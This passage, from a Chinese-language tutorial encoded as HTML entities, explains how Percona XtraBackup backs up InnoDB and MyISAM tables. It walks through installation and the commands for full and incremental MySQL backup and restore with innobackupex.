InnoDB&#xFF0C;&#x4F46;&#x662F;&#x5907;&#x4EFD; MyISAM &#x9700;&#x8981;&#x52A0;&#x8BFB;&#x9501;&#x3002; &#x4E3A;&#x4EC0;&#x4E48;&#x8BF4;Xtrabackup&#x662F;&#x9488;&#x5BF9;InnoDB&#x5F15;&#x64CE;&#x7684;&#x5907;&#x4EFD;&#x5DE5;&#x5177;&#xFF1F;&#x5BF9;&#x4E8E;MyISAM&#x8868;&#x53EA;&#x80FD;&#x662F;&#x6E29;&#x5907;&#xFF0C;&#x800C;&#x4E14;&#x4E5F;&#x4E0D;&#x652F;&#x6301;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x3002;&#x800C;XtraBackup&#x66F4;&#x591A;&#x9AD8;&#x7EA7;&#x7279;&#x6027;&#x901A;&#x5E38;&#x53EA;&#x80FD;&#x5728;innodb&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x4E0A;&#x5B9E;&#x73B0;&#xFF0C;&#x800C;&#x4E14;&#x9AD8;&#x7EA7;&#x7279;&#x6027;&#x8FD8;&#x90FD;&#x4F9D;&#x8D56;&#x4E8E;mysql&#x6570;&#x636E;&#x5E93;&#x5BF9;innodb&#x5F15;&#x64CE;&#x5B9E;&#x73B0;&#x4E86;&#x5355;&#x72EC;&#x8868;&#x7A7A;&#x95F4;&#xFF0C;&#x5426;&#x5219;&#x6CA1;&#x529E;&#x6CD5;&#x5B9E;&#x73B0;&#x5355;&#x8868;&#x6216;&#x5355;&#x5E93;&#x5BFC;&#x51FA;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x8BF4;Xtrabackup&#x662F;&#x4E3A;InnoDB&#x800C;&#x751F;&#x4E5F;&#x4E0D;&#x4E3A;&#x8FC7;&#xFF01; &#x5B98;&#x7F51;&#x8F6F;&#x4EF6;&#x4E0B;&#x8F7D;&#xFF1A;https://www.percona.com/downloads/XtraBackup/LATEST/&#x7528;&#x6237;&#x64CD;&#x4F5C;&#x624B;&#x518C;&#xFF1A;http://www.percona.com/doc/percona-xtrabackup/2.4/index.html Xtrabackup&#x5907;&#x4EFD;&#x539F;&#x7406;1&#x3001;InnoDB&#x7684;&#x5907;&#x4EFD;&#x539F;&#x7406;&#x5728;InnoDB&#x5185;&#x90E8;&#x4F1A;&#x7EF4;&#x62A4;&#x4E00;&#x4E2A;redo&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x53EB;&#x505A;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x3002;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x4F1A;&#x5B58;&#x50A8;&#x6BCF;&#x4E00;&#x4E2A;InnoDB&#x8868;&#x6570;&#x636E;&#x7684;&#x8BB0;&#x5F55;&#x4FEE;&#x6539;&#x3002;&#x5F53;InnoDB&#x542F;&#x52A8;&#x65F6;&#xFF0C;InnoDB&#x4F1A;&#x68C0;&#x67E5;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x548C;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#xFF0C;&#x5E76;&#x6267;&#x884C;&#x4E24;&#x4E2A;&#x6B65;&#x9AA4;&#xFF1A;&#x5B83;&#x5E94;&#x7528;&#xFF08;&#x524D;&#x6EDA;&#xFF09;&#x5DF2;&#x7ECF;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x5230;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x5C06;&#x4FEE;&#x6539;&#x8FC7;&#x4F46;&#x6CA1;&#x6709;&#x63D0;&#x4EA4;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x56DE;&#x6EDA;&#x64CD;&#x4F5C;&#x3002; &#x5907;&#x4EFD;&#x8FC7;&#x7A0B;Xtrabackup&#x5728;&#x542F;&#x52A8;&#x65F6;&#x4F1A;&#x8BB0;&#x4F4F;log sequence number&#xFF08;LSN&#xFF09;&#xFF0C;&#x5E76;&#x4E14;&#x590D;&#x5236;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x3002;&#x590D;&#x5236;&#x8FC7;&#x7A0B;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x65F6;&#x95F4;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x671F;&#x95F4;&#x5982;&#x679C;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x6709;&#x6539;&#x52A8;&#xFF0C;&#x90A3;&#x4E48;&#x5C06;&#x4F1A;&#x4F7F;&#x6570;&#x636E;&#x5E93;&#x5904;&#x4E8E;&#x4E00;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x65F6;&#x95F4;&#x70B9;&#x3002;&#x8FD9;&#x65F6;&#xFF0C;xtrabackup&#x4F1A;&#x8FD0;&#x884C;&#x4E00;&#x4E2A;&#x540E;&#x53F0;&#x8FDB;&#x7A0B;&#xFF0C;&#x7528;&#x4E8E;&#x76D1;&#x89C6;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#xFF0C;&#x5E76;&#x4ECE;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x590D;&#x5236;&#x6700;&#x65B0;&#x7684;&#x4FEE;&#x6539;&#x3002;Xtrabackup&#x5FC5;&#x987B;&#x6301;&#x7EED;&#x7684;&#x505A;&#x8FD9;&#x4E2A;&#x64CD;&#x4F5C;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x662F;&#x4F1A;&#x8F6E;&#x8F6C;&#x91CD;&#x590D;&#x7684;&#x5199;&#x5165;&#xFF0C;&#x5E76;&#x4E14;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x53EF;&#x4EE5;&#x88AB;&#x91CD;&#x7528;&#x3002;&#x6240;&#x4EE5;xtrabackup&#x81EA;&#x542F;&#x52A8;&#x5F00;&#x59CB;&#xFF0C;&#x5C31;&#x4E0D;&#x505C;&#x7684;&#x5C06;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x4E2D;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x7684;&#x4FEE;&#x6539;&#x90FD;&#x8BB0;&#x5F55;&#x4E0B;&#x6765;&#x3002; &#x51C6;&#x5907;&#x8FC7;&#x7A0B;&#x4E0A;&#x9762;&#x5C31;&#x662F;xtrabackup&#x7684;&#x5907;&#x4EFD;&#x8FC7;&#x7A0B;&#x3002;&#x63A5;&#x4E0B;&#x6765;&#x662F;&#x51C6;&#x5907;&#xFF08;prepare&#xFF09;&#x8FC7;&#x7A0B;&#x3002;&#x5728;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;xtrabackup&#x4F7F;&#x7528;&#x4E4B;&#x524D;&#x590D;&#x5236;&#x7684;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#xFF0C;&#x5BF9;&#x5404;&#x4E2A;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x6267;&#x884C;&#x707E;&#x96BE;&#x6062;&#x590D;&#xFF08;&#x5C31;&#x50CF;mysql&#x521A;&#x542F;&#x52A8;&#x65F6;&#x8981;&#x505A;&#x7684;&#x4E00;&#x6837;&#xFF09;&#x3002;&#x5F53;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x5C31;&#x53EF;&#x4EE5;&#x505A;&#x6062;&#x590D;&#x8FD8;&#x539F;&#x4E86;&#x3002; 2&#x3001;MyISAM&#x7684;&#x5907;&#x4EFD;&#x539F;&#x7406;&#x4EE5;&#x4E0A;&#x7684;&#x8FC7;&#x7A0B;&#x5728;xtrabackup&#x7684;&#x7F16;&#x8BD1;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x4E2D;&#x5B9E;&#x73B0;&#x3002;&#x7A0B;&#x5E8F;innobackupex&#x53EF;&#x4EE5;&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x5907;&#x4EFD;MyISAM&#x8868;&#x548C;frm&#x6587;&#x4EF6;&#x4ECE;&#x800C;&#x589E;&#x52A0;&#x4E86;&#x4FBF;&#x6377;&#x548C;&#x529F;&#x80FD;&#x3002;Innobackupex&#x4F1A;&#x542F;&#x52A8;xtrabackup&#xFF0C;&#x76F4;&#x5230;xtrabackup&#x590D;&#x5236;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x540E;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;FLUSH TABLES WITH READ LOCK&#x6765;&#x963B;&#x6B62;&#x65B0;&#x7684;&#x5199;&#x5165;&#x8FDB;&#x6765;&#x5E76;&#x628A;MyISAM&#x8868;&#x6570;&#x636E;&#x5237;&#x5230;&#x786C;&#x76D8;&#x4E0A;&#xFF0C;&#x4E4B;&#x540E;&#x590D;&#x5236;MyISAM&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x6700;&#x540E;&#x91CA;&#x653E;&#x9501;&#x3002; &#x5907;&#x4EFD;MyISAM&#x548C;InnoDB&#x8868;&#x6700;&#x7EC8;&#x4F1A;&#x5904;&#x4E8E;&#x4E00;&#x81F4;&#xFF0C;&#x5728;&#x51C6;&#x5907;&#xFF08;prepare&#xFF09;&#x8FC7;&#x7A0B;&#x7ED3;&#x675F;&#x540E;&#xFF0C;InnoDB&#x8868;&#x6570;&#x636E;&#x5DF2;&#x7ECF;&#x524D;&#x6EDA;&#x5230;&#x6574;&#x4E2A;&#x5907;&#x4EFD;&#x7ED3;&#x675F;&#x7684;&#x70B9;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x56DE;&#x6EDA;&#x5230;xtrabackup&#x521A;&#x5F00;&#x59CB;&#x65F6;&#x7684;&#x70B9;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x95F4;&#x70B9;&#x4E0E;&#x6267;&#x884C;FLUSH TABLES WITH READ LOCK&#x7684;&#x65F6;&#x95F4;&#x70B9;&#x76F8;&#x540C;&#xFF0C;&#x6240;&#x4EE5;myisam&#x8868;&#x6570;&#x636E;&#x4E0E;InnoDB&#x8868;&#x6570;&#x636E;&#x662F;&#x540C;&#x6B65;&#x7684;&#x3002;&#x7C7B;&#x4F3C;oracle&#x7684;&#xFF0C;InnoDB&#x7684;prepare&#x8FC7;&#x7A0B;&#x53EF;&#x4EE5;&#x79F0;&#x4E3A;recover&#xFF08;&#x6062;&#x590D;&#xFF09;&#xFF0C;myisam&#x7684;&#x6570;&#x636E;&#x590D;&#x5236;&#x8FC7;&#x7A0B;&#x53EF;&#x4EE5;&#x79F0;&#x4E3A;restore&#xFF08;&#x8FD8;&#x539F;&#xFF09;&#x3002; Xtrabackup&#x548C;innobackupex&#x8FD9;&#x4E24;&#x4E2A;&#x5DE5;&#x5177;&#x90FD;&#x63D0;&#x4F9B;&#x4E86;&#x8BB8;&#x591A;&#x524D;&#x6587;&#x6CA1;&#x6709;&#x63D0;&#x5230;&#x7684;&#x529F;&#x80FD;&#x7279;&#x70B9;&#x3002;&#x624B;&#x518C;&#x4E0A;&#x6709;&#x5BF9;&#x5404;&#x4E2A;&#x529F;&#x80FD;&#x90FD;&#x6709;&#x8BE6;&#x7EC6;&#x7684;&#x4ECB;&#x7ECD;&#x3002;&#x7B80;&#x5355;&#x4ECB;&#x7ECD;&#x4E0B;&#xFF0C;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x63D0;&#x4F9B;&#x4E86;&#x5982;&#x6D41;&#xFF08;streaming&#xFF09;&#x5907;&#x4EFD;&#xFF0C;&#x589E;&#x91CF;&#xFF08;incremental&#xFF09;&#x5907;&#x4EFD;&#x7B49;&#xFF0C;&#x901A;&#x8FC7;&#x590D;&#x5236;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x590D;&#x5236;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x548C;&#x63D0;&#x4EA4;&#x65E5;&#x5FD7;&#x5230;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF08;&#x524D;&#x6EDA;&#xFF09;&#x5B9E;&#x73B0;&#x4E86;&#x5404;&#x79CD;&#x590D;&#x5408;&#x5907;&#x4EFD;&#x65B9;&#x5F0F;&#x3002; &#x4EC0;&#x4E48;&#x662F;&#x6D41;&#x5907;&#x4EFD;&#xFF1F;&#x6D41;&#x5907;&#x4EFD;&#x662F;&#x6307;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#x901A;&#x8FC7;&#x6807;&#x51C6;&#x8F93;&#x51FA;STDOUT&#x4F20;&#x8F93;&#x7ED9;tar&#x7A0B;&#x5E8F;&#x8FDB;&#x884C;&#x5F52;&#x6863;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x5355;&#x7EAF;&#x7684;&#x5C06;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x5230;&#x6307;&#x5B9A;&#x7684;&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x53C2;&#x6570;&#x2013;stream=tar&#x8868;&#x793A;&#x5F00;&#x542F;&#x6D41;&#x5907;&#x4EFD;&#x529F;&#x80FD;&#x5E76;&#x6253;&#x5305;&#x3002;&#x540C;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x6D41;&#x5907;&#x4EFD;&#x5230;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x3002; Xtrabackup&#x5B9E;&#x73B0;&#x7EC6;&#x8282;XtraBackup&#x4EE5;read-write&#x6A21;&#x5F0F;&#x6253;&#x5F00;innodb&#x7684;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x590D;&#x5236;&#x3002;&#x5176;&#x5B9E;&#x5B83;&#x4E0D;&#x4F1A;&#x4FEE;&#x6539;&#x6B64;&#x6587;&#x4EF6;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x8FD0;&#x884C; XtraBackup&#x7684;&#x7528;&#x6237;&#xFF0C;&#x5FC5;&#x987B;&#x5BF9;innodb&#x7684;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x5177;&#x6709;&#x8BFB;&#x5199;&#x6743;&#x9650;&#x3002;&#x4E4B;&#x6240;&#x4EE5;&#x91C7;&#x7528;read-write&#x6A21;&#x5F0F;&#x662F;&#x56E0;&#x4E3A;XtraBackup&#x91C7;&#x7528;&#x4E86;&#x5176;&#x5185;&#x7F6E;&#x7684; innodb&#x5E93;&#x6765;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#xFF0C;&#x800C;innodb&#x5E93;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x662F;rw&#x7684;&#x3002; XtraBackup&#x8981;&#x4ECE;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x590D;&#x5236;&#x5927;&#x91CF;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x6240;&#x4EE5;&#x5B83;&#x5C3D;&#x53EF;&#x80FD;&#x5730;&#x4F7F;&#x7528;posix_fadvise()&#xFF0C;&#x6765;&#x544A;&#x8BC9;OS&#x4E0D;&#x8981;&#x7F13;&#x5B58;&#x8BFB;&#x53D6;&#x5230;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4ECE; &#x800C;&#x63D0;&#x5347;&#x6027;&#x80FD;&#x3002;&#x56E0;&#x4E3A;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x4E0D;&#x4F1A;&#x91CD;&#x7528;&#x5230;&#x4E86;&#xFF0C;OS&#x5374;&#x6CA1;&#x6709;&#x8FD9;&#x4E48;&#x806A;&#x660E;&#x3002;&#x5982;&#x679C;&#x8981;&#x7F13;&#x5B58;&#x4E00;&#x4E0B;&#x7684;&#x8BDD;&#xFF0C;&#x51E0;&#x4E2A;G&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4F1A;&#x5BF9;OS&#x7684;&#x865A;&#x62DF;&#x5185;&#x5B58;&#x9020;&#x6210;&#x5F88;&#x5927;&#x7684;&#x538B;&#x529B;&#xFF0C;&#x5176;&#x5B83;&#x8FDB;&#x7A0B;&#xFF0C;&#x6BD4;&#x5982; mysqld&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x88AB;swap&#x51FA;&#x53BB;&#xFF0C;&#x8FD9;&#x6837;&#x7CFB;&#x7EDF;&#x5C31;&#x4F1A;&#x53D7;&#x5230;&#x5F88;&#x5927;&#x5F71;&#x54CD;&#x4E86;&#x3002; &#x5728;&#x5907;&#x4EFD;innodb page&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;XtraBackup&#x6BCF;&#x6B21;&#x8BFB;&#x5199;1MB&#x7684;&#x6570;&#x636E;&#xFF0C;1MB/16KB=64&#x4E2A;page&#x3002;&#x8FD9;&#x4E2A;&#x4E0D;&#x53EF;&#x914D;&#x7F6E;&#x3002;&#x8BFB;1MB&#x6570;&#x636E;&#x4E4B; &#x540E;&#xFF0C;XtraBackup&#x4E00;&#x9875;&#x4E00;&#x9875;&#x5730;&#x904D;&#x5386;&#x8FD9;1MB&#x6570;&#x636E;&#xFF0C;&#x4F7F;&#x7528;innodb&#x7684;buf_page_is_corrupted()&#x51FD;&#x6570;&#x68C0;&#x67E5;&#x6B64;&#x9875;&#x7684;&#x6570;&#x636E;&#x662F;&#x5426;&#x6B63;&#x5E38;&#xFF0C;&#x5982;&#x679C;&#x6570;&#x636E;&#x4E0D;&#x6B63;&#x5E38;&#xFF0C;&#x5C31;&#x91CD;&#x65B0;&#x8BFB;&#x53D6;&#x8FD9;&#x4E00;&#x9875;&#xFF0C;&#x6700;&#x591A;&#x91CD;&#x65B0;&#x8BFB;&#x53D6;10&#x6B21;&#xFF0C;&#x5982;&#x679C;&#x8FD8;&#x662F;&#x5931;&#x8D25;&#xFF0C;&#x5907;&#x4EFD;&#x5C31;&#x5931;&#x8D25;&#x4E86;&#xFF0C;&#x9000;&#x51FA;&#x3002;&#x5728;&#x590D;&#x5236;transactions log&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6BCF;&#x6B21;&#x8BFB;&#x5199;512KB&#x7684;&#x6570;&#x636E;&#x3002;&#x540C;&#x6837;&#x4E0D;&#x53EF;&#x4EE5;&#x914D;&#x7F6E;&#x3002; Xtrabackup&#x5B89;&#x88C5;&#x4E0E;&#x5378;&#x8F7D;&#x5728;&#x5B98;&#x7F51;&#x4E2D;&#xFF0C;&#x590D;&#x5236;&#x76F8;&#x5173;&#x94FE;&#x63A5;&#x4E0B;&#x8F7D;&#x6700;&#x65B0;&#x7248;&#x672C;https://www.percona.com/downloads/XtraBackup/LATEST/ 1234567# &#x5B89;&#x88C5;cd /data/install_packageswget https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.5/binary/redhat/6/x86_64/percona-xtrabackup-24-2.4.5-1.el6.x86_64.rpmyum install percona-xtrabackup-24-2.4.5-1.el6.x86_64.rpm# &#x5982;&#x679C;&#x63D0;&#x793A;&#x7F3A;&#x5931;&#x4F9D;&#x8D56;&#x5305;# yum -y install perl perl-devel libaio libaio-devel perl-Time-HiRes perl-DBD-MySQL 123456# &#x5982;&#x679C;&#x7248;&#x672C;&#x9519;&#x8BEF;&#xFF0C;&#x67E5;&#x770B;&#x5DF2;&#x5B89;&#x88C5;&#x7684;percona&#x7248;&#x672C;yum list installed |grep perconapercona-xtrabackup-24.x86_64 2.4.5-1.el6 @/percona-xtrabackup-24-2.4.5-1.el6.x86_64# &#x5378;&#x8F7D;yum remove percona-xtrabackup-24.x86_64 Xtrabackup&#x5E38;&#x7528;&#x53C2;&#x6570;1234567891011121314151617&#x5E38;&#x7528;&#x53C2;&#x6570;&#xFF1A;--user=USER &#x6307;&#x5B9A;&#x5907;&#x4EFD;&#x7528;&#x6237;&#xFF0C;&#x4E0D;&#x6307;&#x5B9A;&#x7684;&#x8BDD;&#x4E3A;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x7528;&#x6237;--password=PASSWD &#x6307;&#x5B9A;&#x5907;&#x4EFD;&#x7528;&#x6237;&#x5BC6;&#x7801;--port=PORT &#x6307;&#x5B9A;&#x6570;&#x636E;&#x5E93;&#x7AEF;&#x53E3;--defaults-group=GROUP-NAME &#x5728;&#x591A;&#x5B9E;&#x4F8B;&#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528;--host=HOST &#x6307;&#x5B9A;&#x5907;&#x4EFD;&#x7684;&#x4E3B;&#x673A;&#xFF0C;&#x53EF;&#x4EE5;&#x4E3A;&#x8FDC;&#x7A0B;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;--apply-log &#x56DE;&#x6EDA;&#x65E5;&#x5FD7;--database &#x6307;&#x5B9A;&#x9700;&#x8981;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x4E4B;&#x95F4;&#x4EE5;&#x7A7A;&#x683C;&#x5206;&#x5F00;--defaults-file &#x6307;&#x5B9A;mysql&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;--copy-back &#x5C06;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x590D;&#x5236;&#x56DE;&#x539F;&#x59CB;&#x4F4D;&#x7F6E;--incremental &#x589E;&#x91CF;&#x5907;&#x4EFD;&#xFF0C;&#x540E;&#x9762;&#x8DDF;&#x8981;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x7684;&#x8DEF;&#x5F84;--incremental-basedir=DIRECTORY &#x589E;&#x91CF;&#x5907;&#x4EFD;&#x65F6;&#x4F7F;&#x7528;&#x6307;&#x5411;&#x4E0A;&#x4E00;&#x6B21;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x6240;&#x5728;&#x7684;&#x76EE;&#x5F55;--incremental-dir=DIRECTORY &#x589E;&#x91CF;&#x5907;&#x4EFD;&#x8FD8;&#x539F;&#x7684;&#x65F6;&#x5019;&#x7528;&#x6765;&#x5408;&#x5E76;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x5230;&#x5168;&#x91CF;&#xFF0C;&#x7528;&#x6765;&#x6307;&#x5B9A;&#x5168;&#x5907;&#x8DEF;&#x5F84;--redo-only &#x5BF9;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x8FDB;&#x884C;&#x5408;&#x5E76;--rsync &#x52A0;&#x5FEB;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#xFF0C;&#x9002;&#x7528;&#x4E8E;non-InnoDB&#x6570;&#x636E;&#x5E93;&#x5F15;&#x64CE;&#x3002;&#x4E0D;&#x4E0E;--stream&#x5171;&#x7528;--safe-slave-backup--no-timestamp &#x751F;&#x6210;&#x7684;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x4E0D;&#x4EE5;&#x65F6;&#x95F4;&#x6233;&#x4E3A;&#x76EE;&#x5F55;. &#x5B8C;&#x5168;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x5B8C;&#x5168;&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#xFF1A;/data/backup/full&#x5B8C;&#x5168;&#x5907;&#x4EFD;&#x4E0E;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x6BCF;&#x6B21;&#x547D;&#x4EE4;&#x64CD;&#x4F5C;&#x6210;&#x529F;&#x7684;&#x6807;&#x5FD7;&#x662F;&#xFF0C;&#x65E5;&#x5FD7;&#x7ED3;&#x5C3E;&#x5904;&#x6253;&#x5370;&#x3010;completed OK!&#x3011; 12345678910111213141516171819# &#x5168;&#x91CF;&#x5907;&#x4EFD;innobackupex --user=root --password=passwd /data/backup/full# &#x4E0A;&#x4E2A;&#x547D;&#x4EE4;&#x5728;&#x6211;&#x7684; /data/backup/full/ &#x76EE;&#x5F55;&#x751F;&#x6210;&#x4E86;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#x3010;2017-01-20_10-52-43&#x3011;# &#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FD9;&#x4E2A;&#x5907;&#x4EFD;&#x4E0D;&#x80FD;&#x7528;&#x4E8E;&#x6062;&#x590D;&#xFF0C;&#x56E0;&#x4E3A;&#x5907;&#x4EFD;&#x7684;&#x6570;&#x636E;&#x4E2D;&#x53EF;&#x80FD;&#x4F1A;&#x5305;&#x542B;&#x5C1A;&#x672A;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x6216;&#x5DF2;&#x7ECF;&#x63D0;&#x4EA4;&#x4F46;&#x5C1A;&#x672A;&#x540C;&#x6B65;&#x81F3;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x4E8B;&#x52A1;&#xFF0C;&#x6B64;&#x65F6;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x5904;&#x4E8E;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x72B6;&#x6001;# &#x56E0;&#x6B64;&#xFF0C;&#x6211;&#x4EEC;&#x73B0;&#x5728;&#x5C31;&#x662F;&#x8981;&#x901A;&#x8FC7;&#x56DE;&#x6EDA;&#x672A;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x53CA;&#x540C;&#x6B65;&#x5DF2;&#x7ECF;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x81F3;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x4E5F;&#x4F7F;&#x5F97;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x5904;&#x4E8E;&#x4E00;&#x81F4;&#x6027;&#x72B6;&#x6001;&#x3002;innobackupex --user=root --password --defaults-file=/data/mysql/my.cnf --apply-log /data/backup/full/2017-01-20_10-52-43# &#x6062;&#x590D;&#x64CD;&#x4F5C;&#x6F14;&#x7EC3;# &#x5173;&#x6389;&#x670D;&#x52A1;&#xFF0C;&#x8FC1;&#x79FB;&#x5DF2;&#x6709;&#x7684;&#x6570;&#x636E;&#x76EE;&#x5F55;service mysql stopmv /data/mysql/data /data/mysql/data_oldmkdir -p /data/mysql/data# &#x6267;&#x884C;innobackupex&#x6062;&#x590D;&#x547D;&#x4EE4;innobackupex --defaults-file=/data/mysql/my.cnf --user=root --password=passwd --copy-back /data/backup/full/2017-01-20_10-52-43# &#x5BF9;&#x65B0;&#x76EE;&#x5F55;&#x6267;&#x884C;&#x8D4B;&#x6743;&#x64CD;&#x4F5C;&#xFF0C;&#x6B64;&#x64CD;&#x4F5C;&#x9700;&#x5728;innobackupex&#x6062;&#x590D;&#x547D;&#x4EE4;&#x540E;chown -R mysql.mysql /data/mysql/data# &#x91CD;&#x542F;&#x670D;&#x52A1;&#xFF0C;&#x5E76;&#x68C0;&#x67E5;&#x6570;&#x636E;&#x662F;&#x5426;&#x6062;&#x590D;service mysqld start &#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x76EE;&#x5F55;1&#xFF1A;/data/backup/inc1&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x76EE;&#x5F55;2&#xFF1A;/data/backup/inc2 123456789101112131415161718192021222324# &#x5168;&#x91CF;&#x5907;&#x4EFD;innobackupex --defaults-file=/data/mysql/my.cnf --user=root --password=passwd /data/backup/full# &#x7B2C;&#x4E00;&#x6B21;&#x589E;&#x91CF;&#x5907;&#x4EFD;innobackupex --defaults-file=/data/mysql/my.cnf --user=root --password=passwd --incremental /data/backup/inc1 --incremental-basedir=/data/backup/full/2017-01-20_10-52-43# --incremental-basedir&#x6307;&#x7684;&#x662F;&#x5B8C;&#x5168;&#x5907;&#x4EFD;&#x6240;&#x5728;&#x7684;&#x76EE;&#x5F55;# &#x6B64;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7ED3;&#x675F;&#x540E;&#xFF0C;innobackupex&#x547D;&#x4EE4;&#x4F1A;&#x5728;/data/backup&#x76EE;&#x5F55;&#x4E2D;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x4EE5;&#x65F6;&#x95F4;&#x547D;&#x540D;&#x7684;&#x76EE;&#x5F55;&#x4EE5;&#x5B58;&#x653E;&#x6240;&#x6709;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x3002;# &#x53E6;&#x5916;&#xFF0C;&#x5728;&#x6267;&#x884C;&#x8FC7;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4E4B;&#x540E;&#x518D;&#x4E00;&#x6B21;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x65F6;&#xFF0C;&#x5176;--incremental-basedir&#x5E94;&#x8BE5;&#x6307;&#x5411;&#x4E0A;&#x4E00;&#x6B21;&#x7684;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x6240;&#x5728;&#x7684;&#x76EE;&#x5F55;&#x3002;# 